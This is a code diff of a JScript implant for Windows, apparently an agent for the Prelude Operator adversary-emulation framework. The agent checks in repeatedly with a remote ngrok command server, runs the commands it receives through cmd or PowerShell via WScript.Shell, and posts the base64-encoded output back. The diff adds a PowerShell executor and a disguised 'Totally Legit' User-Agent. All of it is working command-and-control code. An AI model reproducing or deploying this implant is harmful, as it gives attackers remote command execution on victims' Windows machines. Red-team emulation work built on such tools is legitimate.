@@ -6,6 +6,8 @@ var TypeLib = new ActiveXObject("Scriptlet.TypeLib");
 var guid = (TypeLib.Guid).replace('{', '').replace('}', '');
 var myGuid = guid.substring(1,guid.length-2);
 
+//Debug Hardcode id
+myGuid = "ACDC";
 
 //TODO: Add Range variable, etc...
 
@@ -17,7 +19,7 @@ var prelude_operator_server = 'https://boomtown.ngrok.io'; // Update with your n
 // ngrok http 3391 
 // This will return you unique url.
 
-var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
+var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
 
 function sleep_for(count)  // TODO Align with JSON Sleep:
 {
@@ -36,9 +38,16 @@ function postText(strURL, json_data)
     {
         // Create the WinHTTPRequest ActiveX Object.
         var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-
+	//WinHttpReq.SetProxy( 2, "127.0.0.1:8888", "" );
         //  Create an HTTP request. 
         var temp = WinHttpReq.Open("POST", strURL, false);  
+		WinHttpReq.SetRequestHeader("User-Agent", "Totally Legit");
+		WinHttpReq.SetRequestHeader("Content-type", "application/json");
+		WinHttpReq.SetRequestHeader("Prelude-Operator", "Header Hunter");
+		
+		
+
+		
 
         //  Send the HTTP request.
         WinHttpReq.Send(json_data);
@@ -97,49 +106,60 @@ function parse_Execute(task)
 	var so_b64 = ""; //Base64 Encoded STDOUT;
 	
 	
-	switch(executor)
+	switch(executor) //TODO, refactor repeated blocks.
 	{
-		case "cmd":
+		case "cmd":  
 			var r = new ActiveXObject("WScript.Shell").Exec(c);
 			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 			so_b64 = Base64.encode(so); //base64 encode stdout.
-			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 			break;
 			
 		case "pwsh":
 			var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe " + c);
 			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 			so_b64 = Base64.encode(so); //base64 encode stdout.
-			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 			break;
 		
-			
+		case "psh":
+			var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe " + c);
+			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
+			so_b64 = Base64.encode(so); //base64 encode stdout.
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd", "psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+JSON.stringify(c)+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			break;
 	}
 	/* debugger
 	WScript.StdOut.WriteLine(JSONResponse);
 	WScript.StdIn.ReadLine();
 	*/
-	
+	Wscript.StdOut.WriteLine(" Sending Back Task Results ");
 	postText(prelude_operator_server, JSONResponse);
 }
 
 
 while(true)
 	{
-		WScript.Echo(postText(prelude_operator_server, JSONCheckin));
+		
 		var checkin_Response = postText(prelude_operator_server, JSONCheckin);
-
-		if(checkin_Response.length < 1) {
+		// debug
+		/*
+		WScript.StdOut.WriteLine(checkin_Response);
+		WScript.StdOut.WriteLine("Response Length : " + checkin_Response.length);
+		
+		*/
+		if(checkin_Response.length == 0) {
 			WScript.Echo("Nothing to See Here");
 			sleep_for(10);
-			
+			continue;
 		}
-		else {
-			
-			parse_Execute(checkin_Response);
-			sleep_for(10);
+		if(checkin_Response.length > 0 )  {	
+		// Check for a task.
+		parse_Execute(checkin_Response);
+		sleep_for(10);
+		}
 	
-		}
+		
 		
 
 }
@@ -150,4 +170,22 @@ References:
 Example if your agent is behind a proxy.
 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-setproxy#examples
 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-send
+
+
+// HttpRequest SetCredentials flags.
+HTTPREQUEST_PROXYSETTING_DEFAULT   = 0;
+HTTPREQUEST_PROXYSETTING_PRECONFIG = 0;
+HTTPREQUEST_PROXYSETTING_DIRECT    = 1;
+HTTPREQUEST_PROXYSETTING_PROXY     = 2;
+
+// Instantiate a WinHttpRequest object.
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+
+// Use proxy_server for all requests outside of 
+// the microsoft.com domain.
+WinHttpReq.SetProxy( HTTPREQUEST_PROXYSETTING_PROXY, 
+                     "proxy_server:80", 
+                     "*.microsoft.com");
+
 */
+
